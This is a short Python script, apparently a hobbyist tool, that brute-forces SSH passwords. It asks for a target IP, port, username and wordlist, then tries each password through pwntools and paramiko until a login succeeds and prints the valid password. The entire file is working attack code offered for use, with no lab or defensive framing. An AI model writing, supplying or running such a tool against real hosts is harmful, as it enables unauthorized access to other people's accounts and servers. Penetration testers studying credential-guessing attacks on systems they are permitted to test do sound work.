from pwn import *
from colorama import Fore, Style
import paramiko

def banner():
    banner_text = '''
 \033[93m--------------------------------------------------------------------------------------------
 ______                   _______                                                        
           _           _                   _                           _    
 ___  ___ | |__       | |__   _ __  _   _ | |_  ___  ___ __      __ __| |   
/ __|/ __|| '_ \      | '_ \ | '__|| | | || __|/ __|/ __|\ \ /\ / // _` |   
\__ \\__ \| | | |     | |_) || |   | |_| || |_ \__ \\__ \ \ V  V /| (_| | _ 
|___/|___/|_| |_|_____|_.__/ |_|    \__,_| \__||___/|___/  \_/\_/  \__,_|(_)
                |_____|                                                     

                    ssh_brutsswd: Bruteforce SSH Password
                                By: J.Rosales

 ----------------------------------------------------------------------------------------------   
    '''
    print(banner_text)

banner()
# Color and Style 
Fore.RED, Fore.GREEN, Fore.BLUE, Fore.WHITE, Style.RESET_ALL, Style.BRIGHT

print('\n')
host = input(Fore.BLUE + Style.BRIGHT +'Enter the IP of the target: ' + Style.RESET_ALL) 
host = host.strip()
port = int(input(Fore.BLUE + Style.BRIGHT + 'Enter the port number: ' + Style.RESET_ALL))
username = input(Fore.BLUE + Style.BRIGHT +'Enter the username of the target: ' + Style.RESET_ALL )
username = username.strip()
filename = input(Fore.BLUE + Style.BRIGHT + 'Enter the filename for the password list: '+ Style.RESET_ALL)
filename = filename.strip()  # Remove leading/trailing whitespace characters
attempts = 0
print('\n')
with open(filename, "r") as p_list:
    for password in p_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempiting password: {} ".format(attempts,Style.BRIGHT + password) + Style.RESET_ALL)
            response = ssh(host=host, port=port, user=username, password=password, timeout=1)
            if response.connected():
                print(Style.BRIGHT+ Fore.GREEN + "[+] Valid password: '{}' !".format(password) + Style.RESET_ALL)
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print(Style.BRIGHT + Fore.RED + '[x] Invalid password!' + Style.RESET_ALL)
        attempts += 1
